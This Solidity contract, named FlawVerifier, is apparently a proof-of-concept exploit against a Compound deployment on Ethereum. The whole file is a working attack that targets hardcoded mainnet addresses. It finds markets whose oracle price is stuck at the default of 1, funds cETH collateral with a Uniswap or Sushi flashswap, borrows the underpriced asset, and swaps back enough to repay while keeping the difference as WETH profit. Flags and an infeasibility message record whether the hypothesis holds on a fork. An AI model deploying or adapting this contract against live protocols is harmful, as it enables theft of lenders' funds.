// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface ICTokenLike {
    function comptroller() external view returns (address);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

interface ICEtherLike {
    function comptroller() external view returns (address);
    function mint() external payable;
    function balanceOf(address account) external view returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

interface IComptrollerLike {
    function oracle() external view returns (address);
    function markets(address cToken)
        external
        view
        returns (bool isListed, uint256 collateralFactorMantissa, bool isComped);
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function getAccountLiquidity(address account)
        external
        view
        returns (uint256 error, uint256 liquidity, uint256 shortfall);
    function borrowGuardianPaused(address cToken) external view returns (bool);
    function mintGuardianPaused(address cToken) external view returns (bool);
}

interface IUniswapAnchoredViewLike {
    function numTokens() external view returns (uint256);
    function getTokenConfig(uint256 i)
        external
        view
        returns (
            address cToken,
            address underlying,
            bytes32 symbolHash,
            uint256 baseUnit,
            uint8 priceSource,
            uint256 fixedPrice,
            address uniswapMarket,
            address reporter,
            uint256 reporterMultiplier,
            bool isUniswapReversed
        );
    function prices(bytes32 symbolHash) external view returns (uint248 price, bool failoverActive);
    function getUnderlyingPrice(address cToken) external view returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2RouterLike {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract FlawVerifier {
    address internal constant TARGET_ORACLE = 0x50ce56A3239671Ab62f185704Caedf626352741e;
    address internal constant COMPTROLLER = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant CETH = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address internal constant SUSHI_ROUTER = 0xd9e1cE17f2641f24Ae83637ab66a2cca9C378B9F;

    uint8 internal constant PRICE_SOURCE_FIXED_ETH = 0;
    uint8 internal constant PRICE_SOURCE_REPORTER = 2;

    uint256 internal constant EXP_SCALE = 1e18;
    uint256 internal constant MIN_PROFIT = 1e15;
    uint256 internal constant TARGET_COLLATERAL_WETH = 0.1 ether;
    uint256 internal constant CETH_DUST = 1_000;

    bytes32 internal constant ETH_HASH = keccak256("ETH");

    struct Opportunity {
        address cToken;
        address underlying;
        bytes32 symbolHash;
        uint256 cash;
        address fundingPair;
        address swapRouter;
    }

    address internal _profitToken;
    uint256 internal _profitAmount;

    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    bool public path0_oracleListedBeforeValidate;
    bool public path1_borrowReporterBackedDebtPricedAtOne;
    bool public path2_fixedEthAssetsDependOnEthReporter;
    bool public path3_listedReporterMarketStillPricedAtOne;

    string public exploitPathUsed;
    string public infeasibilityReason;

    address internal chosenDebtCToken;
    address internal chosenDebtUnderlying;
    address internal chosenFundingPair;
    address internal chosenSwapRouter;

    uint256 internal startingWethEquivalent;
    uint256 internal flashBorrowAmount;
    uint256 internal flashRepayAmount;
    bool internal flashActive;

    constructor() {
        _profitToken = WETH;
    }

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _resetState();

        if (IComptrollerLike(COMPTROLLER).oracle() != TARGET_ORACLE) {
            infeasibilityReason = "Compound is not currently pointed at the vulnerable oracle.";
            return;
        }

        startingWethEquivalent = _wethEquivalentBalance();

        (uint248 ethStoredPrice,) = IUniswapAnchoredViewLike(TARGET_ORACLE).prices(ETH_HASH);
        Opportunity memory opportunity = _findReporterDebtOpportunity();

        path1_borrowReporterBackedDebtPricedAtOne = opportunity.cToken != address(0);
        path2_fixedEthAssetsDependOnEthReporter = ethStoredPrice == 1 && _hasListedFixedEthMarket();
        path3_listedReporterMarketStillPricedAtOne = _hasListedReporterPriceOne();
        path0_oracleListedBeforeValidate =
            path1_borrowReporterBackedDebtPricedAtOne ||
            path2_fixedEthAssetsDependOnEthReporter ||
            path3_listedReporterMarketStillPricedAtOne;

        hypothesisValidated = path0_oracleListedBeforeValidate;
        hypothesisRefuted = !hypothesisValidated;

        if (!path0_oracleListedBeforeValidate) {
            infeasibilityReason =
                "No listed market on this fork still exposes the constructor-time reporter price of 1.";
            return;
        }

        if (!path1_borrowReporterBackedDebtPricedAtOne) {
            infeasibilityReason =
                "The rollout bug is still detectable only on collateral-side or paused markets on this fork; no borrowable reporter-backed debt market remains stuck at 1 with usable public liquidity.";
            return;
        }

        if (!_isHealthyCollateralMarket(CETH)) {
            infeasibilityReason = "cETH cannot be used as live collateral on this fork.";
            return;
        }

        chosenDebtCToken = opportunity.cToken;
        chosenDebtUnderlying = opportunity.underlying;
        chosenFundingPair = opportunity.fundingPair;
        chosenSwapRouter = opportunity.swapRouter;

        exploitPathUsed =
            "oracle listed before reporter validate() -> source temporary WETH from a public UniswapV2/Sushi-style flashswap -> mint cETH collateral -> enter Compound -> borrow the reporter-backed market whose stored oracle price is still the constructor default of 1 -> swap only the borrowed amount needed back into WETH to deterministically repay the flashswap and leave the undercharged debt value as realized WETH profit";

        uint256 directSeed = _min(_wethEquivalentBalance(), TARGET_COLLATERAL_WETH);
        if (directSeed != 0) {
            _executeExploit(directSeed, 0);
            return;
        }

        flashActive = true;
        flashBorrowAmount = TARGET_COLLATERAL_WETH;

        address token0 = IUniswapV2PairLike(chosenFundingPair).token0();
        address token1 = IUniswapV2PairLike(chosenFundingPair).token1();
        require(
            (token0 == WETH && token1 == chosenDebtUnderlying) || (token0 == chosenDebtUnderlying && token1 == WETH),
            "bad-pair"
        );

        uint256 amount0Out = token0 == WETH ? flashBorrowAmount : 0;
        uint256 amount1Out = token1 == WETH ? flashBorrowAmount : 0;

        // The flashswap is only a public funding bridge. The exploit value still comes
        // from borrowing a market whose debt is charged against the oracle's constructor-time price of 1.
        IUniswapV2PairLike(chosenFundingPair).swap(amount0Out, amount1Out, address(this), abi.encode(flashBorrowAmount));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(flashActive, "flash-inactive");
        require(msg.sender == chosenFundingPair, "bad-pair");
        require(sender == address(this), "bad-sender");

        uint256 expectedBorrow = abi.decode(data, (uint256));
        uint256 borrowed = amount0 != 0 ? amount0 : amount1;

        require(borrowed == expectedBorrow && borrowed == flashBorrowAmount, "bad-borrow");

        flashRepayAmount = _v2RepayAmount(borrowed);
        _executeExploit(borrowed, flashRepayAmount);

        require(IERC20Like(WETH).balanceOf(address(this)) >= flashRepayAmount, "insufficient-repay");
        _safeTransfer(WETH, chosenFundingPair, flashRepayAmount);

        _wrapAllEth();
        _finalizeProfit();

        flashActive = false;
    }

    function _executeExploit(uint256 collateralWeth, uint256 repayWeth) internal {
        _mintCollateralAndBorrow(collateralWeth);
        _redeemCollateralBackoff();
        _wrapAllEth();

        uint256 targetWethBalance = startingWethEquivalent + repayWeth + MIN_PROFIT;
        uint256 currentWethBalance = IERC20Like(WETH).balanceOf(address(this));

        if (currentWethBalance < targetWethBalance) {
            _swapUnderlyingForExactWeth(targetWethBalance - currentWethBalance);
        }

        _wrapAllEth();

        if (repayWeth == 0) {
            _finalizeProfit();
        }
    }

    function _findReporterDebtOpportunity() internal view returns (Opportunity memory best) {
        IUniswapAnchoredViewLike oracle = IUniswapAnchoredViewLike(TARGET_ORACLE);
        uint256 count = oracle.numTokens();

        for (uint256 i = 0; i < count; ++i) {
            (
                address cToken,
                address underlying,
                bytes32 symbolHash,
                uint256 baseUnit,
                uint8 priceSource,
                uint256 fixedPrice,
                address uniswapMarket,
                address reporter,
                uint256 reporterMultiplier,
                bool isUniswapReversed
            ) = oracle.getTokenConfig(i);

            baseUnit;
            fixedPrice;
            uniswapMarket;
            reporter;
            reporterMultiplier;
            isUniswapReversed;

            if (priceSource != PRICE_SOURCE_REPORTER) {
                continue;
            }
            if (!_isBorrowableTargetMarket(cToken)) {
                continue;
            }
            if (underlying == address(0)) {
                continue;
            }

            (uint248 storedPrice,) = oracle.prices(symbolHash);
            if (storedPrice != 1) {
                continue;
            }

            uint256 cash = _readCash(cToken);
            if (cash == 0) {
                continue;
            }

            (address fundingPair, address swapRouter) = _findFundingPath(underlying);
            if (fundingPair == address(0) || swapRouter == address(0)) {
                continue;
            }

            if (cash > best.cash) {
                best = Opportunity({
                    cToken: cToken,
                    underlying: underlying,
                    symbolHash: symbolHash,
                    cash: cash,
                    fundingPair: fundingPair,
                    swapRouter: swapRouter
                });
            }
        }
    }

    function _hasListedReporterPriceOne() internal view returns (bool) {
        IUniswapAnchoredViewLike oracle = IUniswapAnchoredViewLike(TARGET_ORACLE);
        uint256 count = oracle.numTokens();

        for (uint256 i = 0; i < count; ++i) {
            (
                address cToken,
                address underlying,
                bytes32 symbolHash,
                uint256 baseUnit,
                uint8 priceSource,
                uint256 fixedPrice,
                address uniswapMarket,
                address reporter,
                uint256 reporterMultiplier,
                bool isUniswapReversed
            ) = oracle.getTokenConfig(i);

            underlying;
            baseUnit;
            fixedPrice;
            uniswapMarket;
            reporter;
            reporterMultiplier;
            isUniswapReversed;

            if (priceSource != PRICE_SOURCE_REPORTER) {
                continue;
            }
            if (!_isListedOnTargetComptroller(cToken)) {
                continue;
            }

            (uint248 storedPrice,) = oracle.prices(symbolHash);
            if (storedPrice == 1) {
                return true;
            }
        }

        return false;
    }

    function _mintCollateralAndBorrow(uint256 collateralWeth) internal {
        require(collateralWeth != 0, "zero-seed");
        require(!_mintIsPaused(CETH), "ceth-mint-paused");

        uint256 cEthBefore = ICEtherLike(CETH).balanceOf(address(this));
        _prepareEth(collateralWeth);
        ICEtherLike(CETH).mint{value: collateralWeth}();

        uint256 cEthMinted = ICEtherLike(CETH).balanceOf(address(this)) - cEthBefore;
        require(cEthMinted != 0, "mint-failed");

        address[] memory markets = new address[](1);
        markets[0] = CETH;
        uint256[] memory enterResults = IComptrollerLike(COMPTROLLER).enterMarkets(markets);
        require(enterResults.length == 1 && enterResults[0] == 0, "enter-failed");

        (, uint256 liquidity, uint256 shortfall) = IComptrollerLike(COMPTROLLER).getAccountLiquidity(address(this));
        require(shortfall == 0 && liquidity != 0, "no-liquidity");

        uint256 debtPrice = _readUnderlyingPrice(chosenDebtCToken);
        require(debtPrice != 0, "debt-price-zero");

        uint256 borrowTarget = _borrowAmountFromLiquidity(liquidity, debtPrice);
        uint256 cash = _readCash(chosenDebtCToken);
        require(cash != 0, "cash-zero");

        borrowTarget = _min(borrowTarget, (cash * 99) / 100);
        require(borrowTarget != 0, "borrow-zero");

        uint256 borrowed = _borrowWithBackoff(borrowTarget, chosenDebtUnderlying);
        require(borrowed != 0, "borrow-failed");
    }

    function _borrowWithBackoff(uint256 attempt, address underlying) internal returns (uint256 borrowed) {
        for (uint256 i = 0; i < 10; ++i) {
            if (attempt == 0) {
                break;
            }

            uint256 beforeBal = IERC20Like(underlying).balanceOf(address(this));
            uint256 err = ICTokenLike(chosenDebtCToken).borrow(attempt);
            uint256 afterBal = IERC20Like(underlying).balanceOf(address(this));

            if (err == 0 && afterBal > beforeBal) {
                borrowed = afterBal - beforeBal;
                break;
            }

            attempt = (attempt * 3) / 4;
        }
    }

    function _redeemCollateralBackoff() internal returns (uint256 wethRecovered) {
        uint256 cTokenBalance = ICEtherLike(CETH).balanceOf(address(this));
        if (cTokenBalance <= CETH_DUST) {
            return 0;
        }

        uint256 target = cTokenBalance - CETH_DUST;
        for (uint256 i = 0; i < 10; ++i) {
            if (target == 0) {
                break;
            }

            uint256 ethBefore = address(this).balance;
            uint256 err = ICEtherLike(CETH).redeem(target);
            uint256 ethAfter = address(this).balance;

            if (err == 0 && ethAfter > ethBefore) {
                wethRecovered = ethAfter - ethBefore;
                break;
            }

            target = (target * 3) / 4;
        }
    }

    function _swapUnderlyingForExactWeth(uint256 wethOut) internal returns (uint256 paidIn) {
        require(wethOut != 0, "swap-zero");

        uint256 maxSpend = IERC20Like(chosenDebtUnderlying).balanceOf(address(this));
        require(maxSpend != 0, "no-underlying");

        address[] memory path = new address[](2);
        path[0] = chosenDebtUnderlying;
        path[1] = WETH;

        _safeApprove(chosenDebtUnderlying, chosenSwapRouter, 0);
        _safeApprove(chosenDebtUnderlying, chosenSwapRouter, maxSpend);

        // Exact-output keeps the public swap limited to what is needed to repay the flashswap
        // and surface profit. The exploit value itself is still the underpriced Compound debt.
        uint256[] memory amounts = IUniswapV2RouterLike(chosenSwapRouter).swapTokensForExactTokens(
            wethOut,
            maxSpend,
            path,
            address(this),
            block.timestamp
        );

        paidIn = amounts[0];
        require(paidIn != 0, "swap-failed");
    }

    function _findFundingPath(address underlying) internal view returns (address fundingPair, address swapRouter) {
        fundingPair = IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(underlying, WETH);
        if (fundingPair != address(0)) {
            return (fundingPair, UNISWAP_V2_ROUTER);
        }

        fundingPair = IUniswapV2FactoryLike(SUSHI_FACTORY).getPair(underlying, WETH);
        if (fundingPair != address(0)) {
            return (fundingPair, SUSHI_ROUTER);
        }
    }

    function _hasListedFixedEthMarket() internal view returns (bool) {
        IUniswapAnchoredViewLike oracle = IUniswapAnchoredViewLike(TARGET_ORACLE);
        uint256 count = oracle.numTokens();

        for (uint256 i = 0; i < count; ++i) {
            (
                address cToken,
                address underlying,
                bytes32 symbolHash,
                uint256 baseUnit,
                uint8 priceSource,
                uint256 fixedPrice,
                address uniswapMarket,
                address reporter,
                uint256 reporterMultiplier,
                bool isUniswapReversed
            ) = oracle.getTokenConfig(i);

            underlying;
            symbolHash;
            baseUnit;
            fixedPrice;
            uniswapMarket;
            reporter;
            reporterMultiplier;
            isUniswapReversed;

            if (priceSource == PRICE_SOURCE_FIXED_ETH && _isListedOnTargetComptroller(cToken)) {
                return true;
            }
        }

        return false;
    }

    function _resetState() internal {
        _profitToken = WETH;
        _profitAmount = 0;
        profitAchieved = false;
        hypothesisValidated = false;
        hypothesisRefuted = false;

        path0_oracleListedBeforeValidate = false;
        path1_borrowReporterBackedDebtPricedAtOne = false;
        path2_fixedEthAssetsDependOnEthReporter = false;
        path3_listedReporterMarketStillPricedAtOne = false;

        exploitPathUsed = "";
        infeasibilityReason = "";

        chosenDebtCToken = address(0);
        chosenDebtUnderlying = address(0);
        chosenFundingPair = address(0);
        chosenSwapRouter = address(0);

        flashActive = false;
        flashBorrowAmount = 0;
        flashRepayAmount = 0;
    }

    function _finalizeProfit() internal {
        uint256 finalWeth = _wethEquivalentBalance();
        if (finalWeth > startingWethEquivalent) {
            _profitAmount = finalWeth - startingWethEquivalent;
            profitAchieved = _profitAmount > MIN_PROFIT;
        }
    }

    function _prepareEth(uint256 amount) internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance < amount) {
            IWETHLike(WETH).withdraw(amount - ethBalance);
        }
    }

    function _wrapAllEth() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            IWETHLike(WETH).deposit{value: ethBalance}();
        }
    }

    function _isHealthyCollateralMarket(address cToken) internal view returns (bool) {
        if (!_isListedOnTargetComptroller(cToken)) {
            return false;
        }
        if (_mintIsPaused(cToken)) {
            return false;
        }

        (bool isListed, uint256 collateralFactorMantissa,) = IComptrollerLike(COMPTROLLER).markets(cToken);
        return isListed && collateralFactorMantissa != 0;
    }

    function _isBorrowableTargetMarket(address cToken) internal view returns (bool) {
        return _isListedOnTargetComptroller(cToken) && !_borrowIsPaused(cToken);
    }

    function _isListedOnTargetComptroller(address cToken) internal view returns (bool) {
        if (cToken == address(0)) {
            return false;
        }

        try ICTokenLike(cToken).comptroller() returns (address marketComptroller) {
            if (marketComptroller != COMPTROLLER) {
                return false;
            }
        } catch {
            return false;
        }

        try IComptrollerLike(COMPTROLLER).markets(cToken) returns (bool isListed, uint256, bool) {
            return isListed;
        } catch {
            return false;
        }
    }

    function _readCash(address cToken) internal view returns (uint256 cash) {
        try ICTokenLike(cToken).getCash() returns (uint256 foundCash) {
            cash = foundCash;
        } catch {}
    }

    function _readUnderlyingPrice(address cToken) internal view returns (uint256 price) {
        try IUniswapAnchoredViewLike(TARGET_ORACLE).getUnderlyingPrice(cToken) returns (uint256 foundPrice) {
            price = foundPrice;
        } catch {}
    }

    function _borrowIsPaused(address cToken) internal view returns (bool paused) {
        try IComptrollerLike(COMPTROLLER).borrowGuardianPaused(cToken) returns (bool foundPaused) {
            paused = foundPaused;
        } catch {}
    }

    function _mintIsPaused(address cToken) internal view returns (bool paused) {
        try IComptrollerLike(COMPTROLLER).mintGuardianPaused(cToken) returns (bool foundPaused) {
            paused = foundPaused;
        } catch {}
    }

    function _borrowAmountFromLiquidity(uint256 liquidity, uint256 debtPrice) internal pure returns (uint256) {
        if (liquidity == 0 || debtPrice == 0) {
            return 0;
        }
        return (liquidity * EXP_SCALE) / debtPrice;
    }

    function _wethEquivalentBalance() internal view returns (uint256) {
        return IERC20Like(WETH).balanceOf(address(this)) + address(this).balance;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer-failed");
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve-failed");
    }

    function _v2RepayAmount(uint256 borrowed) internal pure returns (uint256) {
        return ((borrowed * 1000) / 997) + 1;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}
